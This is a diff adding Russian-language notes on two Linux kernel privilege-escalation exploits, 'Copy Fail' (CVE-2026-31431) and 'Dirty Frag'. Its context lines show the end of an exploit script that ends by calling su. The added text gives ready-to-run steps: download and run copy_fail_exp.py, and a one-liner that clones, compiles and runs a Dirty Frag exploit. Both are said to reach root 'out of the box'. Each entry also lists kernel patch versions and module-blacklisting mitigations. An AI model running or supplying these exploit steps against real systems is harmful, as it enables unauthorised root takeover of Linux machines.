@@ -216,3 +216,28 @@ https://github.com/theori-io/copy-fail-CVE-2026-31431/tree/main
 while i<len(e):c(f,i,e[i:i+4]);i+=4
 g.system("su")
 
+        Copy Fail - CVE-2026-31431 (LPE)
+
+        1. https://github.com/theori-io/copy-fail-CVE-2026-31431/tree/main
+        2. Работает из коробки на Python
+        3. Экслойт работает великолепно поднимая привелегии от обычного пользователя до ROOT
+        4. Уязвимость CVE-2026-31431 (кодовое название — Copy Fail) — это логическая ошибка в криптографическом компоненте ядра Linux, которая позволяет локальному пользователю получить права суперпользователя (root). Проблема связана с модулем algif_aead и шаблоном authencesn.  Скачиваем с https://github.com/theori-io/copy-fail-CVE-2026-31431/tree/main файл copy_fail_exp.py и запускаем Python3 copy_fail_exp.py --> и мы root
+        5. Способы исправления
+        5.1 Обновление ядра до версии с патчем. Уязвимость устранена в следующих релизах ядра Linux: 6.18.22, 6.19.12 и 7.0. Патч откатывает оптимизацию, внесённую в 2017 году, которая позволяла размещать страницы страничного кэша непосредственно в целевом scatterlist, доступном для записи
+        5.2 Временные меры до установки обновления: можно отключить модуль algif_aead. Для этого выполните команды:
+        echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
+        rmmod algif_aead 2>/dev/null
+
+        Dirty Frag
+
+        1. Однострочная команда с компиляций и запуском git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+        2. Работает из коробки
+        3. Экслойт работает великолепно поднимая привелегии от обычного пользователя до ROOT
+        4. Dirty Frag — это уязвимость (класс уязвимостей), которая позволяет получить root-доступ в большинстве дистрибутивов Linux за счет объединения уязвимостей xfrm-ESP Page-Cache Write и RxRPC Page-Cache Write.
+        5. Способы исправления
+        5.1 В настоящее время испарвоений для дра не сущестет, но можно смягчить последствия:
+        Смягчение последствий
+        Используйте следующую команду, чтобы удалить модули, в которых обнаружены уязвимости, и очистить кэш страниц.
+        sh -c "printf 'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' > /etc/modprobe.d/dirtyfrag.conf; rmmod esp4 esp6 rxrpc 2>/dev/null; echo 3 > /proc/sys/vm/drop_caches; true"
+
+
